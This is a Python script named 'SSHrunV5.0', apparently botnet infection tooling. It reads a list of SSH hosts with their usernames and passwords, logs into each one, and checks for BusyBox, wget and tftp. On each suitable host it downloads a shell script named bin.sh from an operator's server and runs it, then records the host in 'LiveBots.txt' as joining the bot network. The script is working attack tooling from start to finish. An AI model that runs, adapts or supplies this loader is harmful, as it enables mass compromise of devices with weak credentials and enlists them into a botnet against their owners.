import socket
import threading
import time
import sys
import os
from datetime import datetime
try:
	import paramiko
except ImportError:
	print('[' + str(datetime.now().time()) + '] You do not have paramiko installed')
	sys.exit()

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

#def fingerPrint(jobID, host, username, password, pot):
def fingerPrint(jobID, info):
	##### PARSE TARGET INFO #####
	host, username, password, pot = info.split('|')
	##### CHECK TO MAKE SURE PORT 22 ON TARGET IS OPEN #####
	port = int(pot)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(10)
	try:
		s.connect((host, int(port)))
		s.close()
	except:
		got=False
	##### IF TARGET PORT OPEN, SSH TO IT #####
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	paramiko.util.log_to_file("/dev/null")
	boxAvailable = False
	try:
		##### CHECK FOR BUSYBOX #####
		ssh.connect(host, port=int(port), username=username, password=password, timeout=15)
		stdin, stdout, stderr = ssh.exec_command("/bin/busybox; /bin/busybox wget; /bin/busybox tftp")
		tftpOut = stdout.read()
		tftpErr = stderr.read()
		if 'BusyBox' in tftpOut or 'BusyBox' in tftpErr:
			boxAvailable = True
			print('[' + str(datetime.now().time()) + '] job ID: '+G+'' + str(jobID) + ''+W+' -> '+G+'BusyBox'+W+' '+R+'' + str(jobID) + ''+W+' ' + str(host) + '|' + str(username) + '|' + str(password) + '|' + str(port))
		got = True
	except:
		got=False
	try:
		if got != False:
			##### GET TARGET ENVIRONMENT #####
			stdin, stdout, stderr = ssh.exec_command("/bin/busybox wget; /bin/busybox tftp; cd /tmp", timeout=15)
			output = stdout.read()
			errs = stderr.read()
			ssh.close()
		else:
			ssh.close()
	except:
		got=False
	try:
		##### CHECK IF TARGET IS ACTUALLY ABLE TO DOWNLOAD BOT #####
		if ('Usage: wget' in output) or ('Usage: tftp' in output) or ('Usage: wget' in errs) or ('Usage: tftp' in errs): 
			if boxAvailable == False:
				output = ('[' + str(datetime.now().time()) + '] job ID: '+R+'' + str(jobID) + ''+W+' -> '+R+' WGET/TFTP'+W+': ' + str(host) + '|' + str(username) + '|' + str(password) + '|' + str(port))
			elif boxAvailable == True:
				output = ('[' + str(datetime.now().time()) + '] job ID: '+G+'' + str(jobID) + ''+W+' -> '+G+' WGET/TFTP'+W+': ' + str(host) + '|' + str(username) + '|' + str(password) + '|' + str(port))
			print(output)
			outFile = open('LiveBots.txt', 'a')
			outFile.write(output + str('\n'))
			outFile.close()
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			paramiko.util.log_to_file("/dev/null")
			ssh.connect(host, port=int(port), username=username, password=password, timeout=15)
			##### DOWNLOAD AND EXECUTE BOT ON TARGET #####
			if boxAvailable == True:
				try:
					############REPLACE 255.255.255.255 WITH YOUR SCANNER IP ON THIS NEXT LINE##################
					stdin, stdout, stderr = ssh.exec_command("sh -c \"/bin/busybox echo begining; cd /tmp; /bin/busybox wget ftp://255.255.255.255/pub/bin.sh -O bin.sh || /bin/busybox tftp -g -r bin.sh 255.255.255.255 || /bin/busybox tftp -m binary 255.255.255.255 -c get bin.sh; /bin/busybox chmod +x bin.sh; (./bin.sh || sh bin.sh) &\" < /dev/null > /dev/null 2>&1", timeout=30)
					bricksError = stderr.read()
					bricks=stdout.read()
				except:
					botGot = False
			output = ('[' + str(datetime.now().time()) + '] job ID: '+G+'' + str(jobID) + ''+W+' -> '+P+'JOINING'+W+': ' + str(host) + '|' + str(username) + '|' + str(password) + '|' + str(port))
			ssh.close()
			if boxAvailable == True:
				print(output)
				outFile = open('LiveBots.txt', 'a')
				outFile.write(output + str('\n'))
				outFile.close()
	except:
		hey = False

print('\n\n**********SSHrunV5.0**********\n\n')
print('[' + str(datetime.now().time()) + '] MASTER PROCESS STARTED')
mon = 0
count = 0
bruteAddrs = open(str(sys.argv[1])).readlines()
for i, target in enumerate(bruteAddrs):
	targetStripped = target.replace('\n', '')
	count = count + 1
	mon = mon + 1
	if mon >= int(sys.argv[2]):
		print(''+R+'' + str(count) + '/' + str(len(bruteAddrs)) + ''+W+'')
		time.sleep(5)
		mon = 0
	t = threading.Thread(target=fingerPrint, args=(count, targetStripped,))
	t.start()

